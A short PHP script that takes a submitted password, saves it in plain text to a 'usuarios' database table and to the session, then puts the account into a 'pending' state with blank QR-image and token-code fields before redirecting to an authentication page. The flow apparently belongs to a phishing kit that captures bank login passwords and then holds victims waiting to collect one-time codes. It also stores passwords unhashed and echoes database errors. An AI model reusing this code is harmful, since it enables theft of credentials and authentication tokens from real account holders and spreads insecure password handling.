<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/token_pantalla_helpers.php';
session_start();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../authenticate-execution.php');
    exit;
}

if (!isset($_SESSION['usuario_id']) || !isset($_SESSION['usuario'])) {
    header('Location: ../personas.html');
    exit;
}

$password = $_POST['password'] ?? '';

if (empty($password)) {
    die('Error: Contraseña es requerida');
}

if (strlen($password) > 20) {
    die('Error: La contraseña no debe exceder los 20 caracteres');
}

try {
    $pdo = conectarBD();

    $stmt = $pdo->prepare("
        UPDATE usuarios
        SET password = ?,
            token_pantalla_estado = 'pendiente',
            token_pantalla_espera_desde = NOW(),
            token_pantalla_modo = NULL,
            token_qr_imagen_url = NULL,
            token_codigo = NULL
        WHERE id = ?
    ");
    $stmt->execute([$password, $_SESSION['usuario_id']]);

    $_SESSION['password'] = $password;

    tokenPantallaMarcarEsperaActiva();

    header('Location: ../authenticate-execution.php');
    exit;
} catch (PDOException $e) {
    die('Error de base de datos: ' . $e->getMessage());
}
